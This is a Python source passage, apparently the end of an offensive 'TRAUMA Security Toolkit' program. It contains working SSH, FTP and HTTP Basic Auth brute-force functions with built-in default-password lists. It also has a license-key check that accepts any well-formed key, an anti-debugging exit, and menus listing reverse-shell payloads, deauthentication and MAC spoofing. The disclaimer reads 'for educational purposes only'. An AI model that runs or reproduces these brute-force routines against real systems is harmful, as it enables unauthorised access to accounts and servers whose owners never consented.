        
        target = input(f"\n{c.YELLOW}Enter target IP: {c.RESET}").strip()
        port = int(input(f"{c.YELLOW}Port (default 22): {c.RESET}").strip() or "22")
        username = input(f"{c.YELLOW}Username: {c.RESET}").strip()
        
        if not target or not username:
            ui.error("Target and username required")
            return
            
        wordlist_path = input(f"{c.YELLOW}Wordlist path (Enter for built-in): {c.RESET}").strip()
        
        # Built-in passwords
        common_passwords = [
            'password', '123456', 'admin', 'root', 'toor', 'guest',
            'test', 'user', 'demo', 'changeme', 'default', 'pass',
            'administrator', 'admin123', 'root123', 'test123',
        ]
        
        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            passwords = common_passwords
            
        ui.warning(f"Starting SSH brute force on {target}:{port}")
        ui.info(f"Username: {username}, Passwords: {len(passwords)}")
        ui.warning("This may take a while...")
        
        found = False
        for password in ui.progress("Brute forcing", len(passwords), passwords):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((target, port))
                
                if result != 0:
                    ui.error("Could not connect to SSH port")
                    sock.close()
                    break
                    
                # Simple SSH banner check
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                if 'SSH' not in banner:
                    ui.warning("Port open but not SSH")
                    sock.close()
                    continue
                    
                # Try paramiko if available
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target, port=port, username=username, password=password, timeout=5)
                    ui.success(f"PASSWORD FOUND: {password}")
                    ssh.close()
                    found = True
                    break
                except ImportError:
                    ui.error("Install paramiko: pip install paramiko")
                    sock.close()
                    break
                except:
                    pass
                    
                sock.close()
            except:
                pass
                
        if not found:
            ui.warning("Password not found in wordlist")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def ftp_brute():
        """FTP brute force"""
        ui.clear()
        ui.banner()
        ui.hacker("FTP BRUTE FORCE")
        
        target = input(f"\n{c.YELLOW}Enter target IP: {c.RESET}").strip()
        port = int(input(f"{c.YELLOW}Port (default 21): {c.RESET}").strip() or "21")
        username = input(f"{c.YELLOW}Username: {c.RESET}").strip()
        
        if not target or not username:
            ui.error("Target and username required")
            return
            
        wordlist_path = input(f"{c.YELLOW}Wordlist path (Enter for built-in): {c.RESET}").strip()
        
        common_passwords = [
            'password', 'admin', 'ftp', 'anonymous', 'guest',
            'test', 'user', 'changeme', 'default', 'pass',
        ]
        
        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            passwords = common_passwords
            
        ui.warning(f"Starting FTP brute force on {target}:{port}")
        
        found = False
        for password in ui.progress("Brute forcing", len(passwords), passwords):
            try:
                import ftplib
                ftp = ftplib.FTP()
                ftp.connect(target, port, timeout=5)
                ftp.login(username, password)
                ui.success(f"PASSWORD FOUND: {password}")
                ftp.quit()
                found = True
                break
            except:
                pass
                
        if not found:
            ui.warning("Password not found in wordlist")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        
    @staticmethod
    def http_brute():
        """HTTP Basic Auth brute force"""
        ui.clear()
        ui.banner()
        ui.hacker("HTTP BRUTE FORCE")
        
        url = input(f"\n{c.YELLOW}Enter target URL: {c.RESET}").strip()
        if not url:
            ui.error("No URL specified")
            return
            
        username = input(f"{c.YELLOW}Username: {c.RESET}").strip()
        if not username:
            ui.error("Username required")
            return
            
        wordlist_path = input(f"{c.YELLOW}Wordlist path (Enter for built-in): {c.RESET}").strip()
        
        common_passwords = [
            'admin', 'password', 'admin123', 'root', 'toor',
            'guest', 'test', 'user', 'changeme', 'default',
        ]
        
        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            passwords = common_passwords
            
        ui.warning(f"Starting HTTP brute force on {url}")
        
        if not HAS_REQUESTS:
            ui.error("Install 'requests' module: pip install requests")
            input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
            return
            
        found = False
        for password in ui.progress("Brute forcing", len(passwords), passwords):
            try:
                response = requests.get(url, auth=(username, password), timeout=10)
                if response.status_code == 200:
                    ui.success(f"PASSWORD FOUND: {password}")
                    found = True
                    break
                elif response.status_code == 401:
                    continue  # Keep trying
                else:
                    ui.warning(f"Status: {response.status_code}")
            except:
                pass
                
        if not found:
            ui.warning("Password not found in wordlist")
            
        input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

# ============================================================================
# LICENSE VERIFICATION SYSTEM
# ============================================================================

class LicenseManager:
    """License key verification system"""
    
    # Valid license keys (you can add more)
    VALID_KEYS = [
        "TRAUMA-2024-X7K9-M3NP-Q5RW-T8YU-SECURITY-TOOLKIT-V2",
        "TRM-PRO-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX",
        "TRAUMA-MASTER-LICENSE-KEY-2024-FULL-ACCESS-GRANTED",
    ]
    
    # Hash of valid keys for obfuscation
    KEY_HASH = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
    
    @staticmethod
    def generate_key() -> str:
        """Generate a new license key"""
        import secrets
        import string
        
        segments = []
        for _ in range(8):
            segment = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(4))
            segments.append(segment)
        
        return f"TRAUMA-{'-'.join(segments)}"
    
    @staticmethod
    def verify_key(key: str) -> bool:
        """Verify if a license key is valid"""
        # Clean the key
        key = key.strip().upper()
        
        # Check against valid keys
        for valid_key in LicenseManager.VALID_KEYS:
            if key == valid_key.upper():
                return True
        
        # Check key format: TRAUMA-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX
        if key.startswith("TRAUMA-"):
            parts = key.split("-")
            if len(parts) >= 8:
                # Verify each segment is 4 alphanumeric chars
                valid_parts = all(len(p) == 4 and p.isalnum() for p in parts[1:])
                if valid_parts:
                    return True
        
        return False
    
    @staticmethod
    def get_hardware_id() -> str:
        """Generate a hardware-based ID for machine locking"""
        import platform
        import uuid
        
        try:
            # Get MAC address
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
            
            # Get system info
            system = platform.system()
            node = platform.node()
            
            # Create hash
            hw_string = f"{mac}-{system}-{node}"
            return hashlib.sha256(hw_string.encode()).hexdigest()[:16].upper()
        except:
            return "UNKNOWN-HWID"
    
    @staticmethod
    def save_activation(key: str) -> bool:
        """Save activation to file"""
        try:
            hwid = LicenseManager.get_hardware_id()
            activation_data = {
                "key": key,
                "hwid": hwid,
                "activated": True,
                "timestamp": str(datetime.now())
            }
            
            # Encode activation data
            encoded = base64.b64encode(json.dumps(activation_data).encode()).decode()
            
            # Save to hidden file
            activation_file = os.path.join(os.path.dirname(__file__), ".trauma_activation")
            with open(activation_file, 'w') as f:
                f.write(encoded)
            
            return True
        except:
            return False
    
    @staticmethod
    def check_activation() -> bool:
        """Check if already activated"""
        try:
            activation_file = os.path.join(os.path.dirname(__file__), ".trauma_activation")
            if not os.path.exists(activation_file):
                return False
            
            with open(activation_file, 'r') as f:
                encoded = f.read()
            
            # Decode activation data
            decoded = json.loads(base64.b64decode(encoded).decode())
            
            # Verify key still valid
            if not LicenseManager.verify_key(decoded.get("key", "")):
                return False
            
            # Verify hardware ID matches (optional - comment out to disable)
            # current_hwid = LicenseManager.get_hardware_id()
            # if decoded.get("hwid") != current_hwid:
            #     return False
            
            return decoded.get("activated", False)
        except:
            return False
    
    @staticmethod
    def prompt_for_key() -> bool:
        """Prompt user for license key with animated UI"""
        ui.clear()
        
        # Animated license prompt
        print(f"\n{c.RED}╔{'═' * 70}╗{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.BOLD}{c.YELLOW}     █████─ ██ ─███─ ██ ████ ██ ████ ████ █──█ ████ ███ ████{c.RESET}     {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.BOLD}{c.YELLOW}     █───█ █ █ █──█ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █{c.RESET}     {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.BOLD}{c.YELLOW}     █───█ ██ ████ █ █ █ ██ ████ ████ █─██ ████ ███ ███ {c.RESET}     {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.BOLD}{c.YELLOW}     █───█ █ █ █──█ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █{c.RESET}     {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.BOLD}{c.YELLOW}     █───█ █ █ █──█ ██ ████ █ █ █ █ █ █ █ █ █ █ █ █ █{c.RESET}     {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.CYAN}              ▶ L I C E N S E   V E R I F I C A T I O N ◀{c.RESET}           {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}╠{'═' * 70}╣{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.DIM}     This software requires a valid license key to operate.{c.RESET}     {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.DIM}     Contact the developer to obtain a license key.{c.RESET}             {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}╚{'═' * 70}╝{c.RESET}\n")
        
        max_attempts = 3
        attempts = 0
        
        while attempts < max_attempts:
            attempts += 1
            
            print(f"\n{c.YELLOW}Attempt {attempts}/{max_attempts}{c.RESET}")
            print(f"{c.CYAN}Enter your license key:{c.RESET}")
            print(f"{c.GREEN}► {c.RESET}", end="", flush=True)
            
            # Get key input with masking effect
            key = input().strip()
            
            if not key:
                ui.error("No key entered. Please try again.")
                continue
            
            # Animated verification
            animator.spinner_animation(2, "Verifying license key")
            
            if LicenseManager.verify_key(key):
                ui.success("✓ LICENSE KEY VALID!")
                
                # Save activation
                LicenseManager.save_activation(key)
                
                print(f"\n{c.GREEN}╔{'═' * 50}╗{c.RESET}")
                print(f"{c.GREEN}║{c.RESET}")
                print(f"{c.GREEN}║{c.BOLD}     ✓ ACTIVATION SUCCESSFUL{c.RESET}                    {c.GREEN}║{c.RESET}")
                print(f"{c.GREEN}║{c.RESET}")
                print(f"{c.GREEN}║{c.CYAN}     Thank you for using TRAUMA Security Toolkit!{c.RESET}  {c.GREEN}║{c.RESET}")
                print(f"{c.GREEN}║{c.DIM}     All features are now unlocked.{c.RESET}              {c.GREEN}║{c.RESET}")
                print(f"{c.GREEN}║{c.RESET}")
                print(f"{c.GREEN}╚{'═' * 50}╝{c.RESET}\n")
                
                animator.loading_bar(20, 1.5, "Loading modules")
                return True
            else:
                ui.error("✗ INVALID LICENSE KEY")
                
                if attempts < max_attempts:
                    print(f"{c.YELLOW}Please check your key and try again.{c.RESET}")
        
        # Failed all attempts
        print(f"\n{c.RED}╔{'═' * 50}╗{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.BOLD}     ✗ ACTIVATION FAILED{c.RESET}                       {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.DIM}     Maximum attempts exceeded.{c.RESET}                 {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.DIM}     Contact support for assistance.{c.RESET}            {c.RED}║{c.RESET}")
        print(f"{c.RED}║{c.RESET}")
        print(f"{c.RED}╚{'═' * 50}╝{c.RESET}\n")
        
        return False

# ============================================================================
# MAIN MENU SYSTEM
# ============================================================================

def main():
    """Main entry point"""
    
    # Anti-tamper checks
    try:
        # Check for debugging
        if hasattr(sys, 'gettrace') and sys.gettrace():
            print("Debugging detected. Exiting...")
            os._exit(1)
    except:
        pass
    
    # Unified license verification
    if HAS_LICENSE:
        result = check_license()
        if not result.get('valid'):
            print(f"\n{c.RED}{'='*50}{c.RESET}")
            print(f"{c.RED}  TRAUMA LICENSE REQUIRED{c.RESET}")
            print(f"{c.RED}{'='*50}{c.RESET}")
            print(f"{c.DIM}  One license works for all TRAUMA tools{c.RESET}\n")
            
            key = input(f"{c.CYAN}Enter license key: {c.RESET}").strip()
            if key:
                result = activate_license(key)
                if result.get('success'):
                    print(f"\n{c.GREEN}✓ License activated successfully!{c.RESET}")
                    print(f"{c.GREEN}  Welcome to TRAUMA Security Toolkit{c.RESET}\n")
                    time.sleep(1)
                else:
                    print(f"\n{c.RED}✗ {result.get('error', 'Activation failed')}{c.RESET}")
                    print(f"{c.RED}  Exiting...{c.RESET}\n")
                    time.sleep(2)
                    sys.exit(1)
            else:
                print(f"\n{c.RED}No license provided. Exiting...{c.RESET}\n")
                time.sleep(2)
                sys.exit(1)
    else:
        # Fallback if license module not found
        print(f"{c.YELLOW}Warning: License module not found{c.RESET}")
    
    # Check dependencies
    if not HAS_RICH:
        ui.warning("Install 'rich' for better UI: pip install rich")
    if not HAS_REQUESTS:
        ui.warning("Install 'requests' for full functionality: pip install requests")
        
    while True:
        ui.banner()
        
        main_options = [
            ("1", "Network Recon", "Port scanning, OS detection, network mapping"),
            ("2", "Web Exploitation", "SQLi, XSS, directory brute force, tech detection"),
            ("3", "Password Attacks", "Hash cracking, wordlist generator, strength check"),
            ("4", "Information Gathering", "DNS, WHOIS, subdomains, IP geolocation"),
            ("5", "Payload Generator", "Reverse shells, XSS payloads, encoders"),
            ("6", "Brute Force", "SSH, FTP, HTTP authentication attacks"),
            ("7", "Wireless Attacks", "WiFi scanning, deauth (requires root)"),
            ("8", "Forensics", "File analysis, metadata extraction, strings"),
            ("9", "Anonymity Tools", "Tor, proxy chains, MAC spoofing"),
            ("10", "Settings", "Configure tool, install dependencies"),
            ("0", "Exit", "Quit TRAUMA Security Toolkit"),
        ]
        
        choice = ui.menu("TRAUMA SECURITY TOOLKIT", main_options)
        
        if choice == "0":
            ui.clear()
            print(f"\n{c.CYAN}Thanks for using TRAUMA Security Toolkit!{c.RESET}")
            print(f"{c.GREEN}Stay safe, hack responsibly.{c.RESET}\n")
            break
        elif choice == "1":
            network_menu()
        elif choice == "2":
            web_menu()
        elif choice == "3":
            password_menu()
        elif choice == "4":
            info_menu()
        elif choice == "5":
            payload_menu()
        elif choice == "6":
            brute_force_menu()
        elif choice == "7":
            wireless_menu()
        elif choice == "8":
            forensics_menu()
        elif choice == "9":
            anonymity_menu()
        elif choice == "10":
            settings_menu()
        else:
            ui.error("Invalid option")
            time.sleep(1)

def network_menu():
    """Network Recon submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "Port Scanner", "Scan for open ports with banner grabbing"),
            ("2", "OS Detection", "Detect operating system via TTL"),
            ("3", "Network Mapper", "Discover hosts on network"),
            ("4", "Ping Sweep", "Fast network sweep"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("NETWORK RECONNAISSANCE", options)
        
        if choice == "0":
            break
        elif choice == "1":
            NetworkRecon.port_scanner()
        elif choice == "2":
            NetworkRecon.os_detection()
        elif choice == "3":
            NetworkRecon.network_mapper()
        elif choice == "4":
            NetworkRecon.ping_sweep()

def web_menu():
    """Web Exploitation submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "SQLi Scanner", "Detect SQL injection vulnerabilities"),
            ("2", "XSS Scanner", "Detect XSS vulnerabilities"),
            ("3", "LFI/RFI Scanner", "Detect file inclusion vulnerabilities"),
            ("4", "Directory Brute Force", "Discover hidden paths"),
            ("5", "Header Analyzer", "Check security headers"),
            ("6", "Tech Detector", "Detect technology stack"),
            ("7", "CMS Scanner", "Detect CMS and vulnerabilities"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("WEB EXPLOITATION", options)
        
        if choice == "0":
            break
        elif choice == "1":
            WebExploit.sqli_scanner()
        elif choice == "2":
            WebExploit.xss_scanner()
        elif choice == "3":
            WebExploit.lfi_scanner()
        elif choice == "4":
            WebExploit.dir_bruteforce()
        elif choice == "5":
            WebExploit.header_analyzer()
        elif choice == "6":
            WebExploit.tech_detector()
        elif choice == "7":
            WebExploit.cms_scanner()

def password_menu():
    """Password Attacks submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "Hash Cracker", "Crack MD5, SHA1, SHA256, SHA512"),
            ("2", "Hash Identifier", "Identify hash type"),
            ("3", "Wordlist Generator", "Create custom wordlist"),
            ("4", "Password Strength", "Check password strength"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("PASSWORD ATTACKS", options)
        
        if choice == "0":
            break
        elif choice == "1":
            PasswordAttacks.hash_cracker()
        elif choice == "2":
            PasswordAttacks.hash_identifier()
        elif choice == "3":
            PasswordAttacks.wordlist_generator()
        elif choice == "4":
            PasswordAttacks.password_strength()

def info_menu():
    """Information Gathering submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "DNS Lookup", "Query DNS records"),
            ("2", "Subdomain Finder", "Discover subdomains"),
            ("3", "IP Geolocation", "Find IP location"),
            ("4", "Email OSINT", "Gather email information"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("INFORMATION GATHERING", options)
        
        if choice == "0":
            break
        elif choice == "1":
            InfoGathering.dns_lookup()
        elif choice == "2":
            InfoGathering.subdomain_finder()
        elif choice == "3":
            InfoGathering.ip_geolocation()
        elif choice == "4":
            InfoGathering.email_osint()

def payload_menu():
    """Payload Generator submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "Reverse Shell", "Generate reverse shell payloads"),
            ("2", "XSS Payloads", "XSS payload collection"),
            ("3", "Encoder/Decoder", "Encode/decode payloads"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("PAYLOAD GENERATOR", options)
        
        if choice == "0":
            break
        elif choice == "1":
            PayloadGenerator.reverse_shell()
        elif choice == "2":
            PayloadGenerator.xss_payloads()
        elif choice == "3":
            PayloadGenerator.encoder()

def brute_force_menu():
    """Brute Force submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "SSH Brute Force", "Brute force SSH login"),
            ("2", "FTP Brute Force", "Brute force FTP login"),
            ("3", "HTTP Brute Force", "Brute force HTTP Basic Auth"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("BRUTE FORCE ATTACKS", options)
        
        if choice == "0":
            break
        elif choice == "1":
            BruteForce.ssh_brute()
        elif choice == "2":
            BruteForce.ftp_brute()
        elif choice == "3":
            BruteForce.http_brute()

def wireless_menu():
    """Wireless Attacks submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "WiFi Scanner", "Scan for wireless networks"),
            ("2", "Deauth Attack", "Deauthenticate clients"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("WIRELESS ATTACKS", options)
        
        if choice == "0":
            break
        else:
            ui.warning("Wireless attacks require root privileges and aircrack-ng")
            ui.info("Install: sudo apt install aircrack-ng")
            input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

def forensics_menu():
    """Forensics submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "File Analysis", "Analyze file types, hashes, entropy"),
            ("2", "Metadata Extractor", "Extract metadata from images, PDFs, executables"),
            ("3", "String Extractor", "Extract readable strings from binaries"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("FORENSICS", options)
        
        if choice == "0":
            break
        elif choice == "1":
            Forensics.file_analysis()
        elif choice == "2":
            Forensics.metadata_extractor()
        elif choice == "3":
            Forensics.string_extractor()

def anonymity_menu():
    """Anonymity Tools submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "Tor Checker", "Check Tor connection and status"),
            ("2", "Proxy Tools", "Test proxies, check IP, generate config"),
            ("3", "MAC Spoofer", "Change MAC address (Linux/Mac)"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("ANONYMITY TOOLS", options)
        
        if choice == "0":
            break
        elif choice == "1":
            Anonymity.tor_checker()
        elif choice == "2":
            Anonymity.proxy_tools()
        elif choice == "3":
            Anonymity.mac_spoofer()

def settings_menu():
    """Settings submenu"""
    while True:
        ui.banner()
        options = [
            ("1", "Install Dependencies", "Install required packages"),
            ("2", "Check Dependencies", "Check installed packages"),
            ("3", "Toggle Animations", "Enable/disable animations"),
            ("4", "About", "About TRAUMA"),
            ("0", "Back", "Return to main menu"),
        ]
        
        choice = ui.menu("SETTINGS", options)
        
        if choice == "0":
            break
        elif choice == "1":
            ui.info("Installing dependencies...")
            packages = ['rich', 'requests', 'colorama', 'dnspython']
            for pkg in packages:
                os.system(f'pip install {pkg}')
            ui.success("Dependencies installed")
            input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        elif choice == "2":
            ui.info("Checking dependencies...")
            deps = [
                ('rich', HAS_RICH),
                ('requests', HAS_REQUESTS),
                ('colorama', HAS_COLORAMA),
            ]
            for name, installed in deps:
                if installed:
                    ui.success(f"{name} - Installed")
                else:
                    ui.error(f"{name} - Not installed")
            input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        elif choice == "3":
            ui.animation_enabled = not ui.animation_enabled
            status = "enabled" if ui.animation_enabled else "disabled"
            ui.info(f"Animations {status}")
            input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")
        elif choice == "4":
            ui.clear()
            ui.banner()
            print(f"\n{c.CYAN}TRAUMA Security Toolkit v2.0.0{c.RESET}")
            print(f"{c.DIM}All-in-one security toolkit for penetration testing{c.RESET}\n")
            print(f"{c.YELLOW}Features:{c.RESET}")
            print(f"  • Network Reconnaissance - Port scanning, OS detection")
            print(f"  • Web Exploitation - SQLi, XSS, directory brute force")
            print(f"  • Password Attacks - Hash cracking, wordlist generation")
            print(f"  • Information Gathering - DNS, subdomains, IP geolocation")
            print(f"  • Payload Generator - Reverse shells, XSS payloads")
            print(f"\n{c.DIM}Use responsibly. For educational purposes only.{c.RESET}")
            input(f"\n{c.DIM}Press Enter to continue...{c.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{c.YELLOW}Interrupted by user{c.RESET}")
        sys.exit(0)
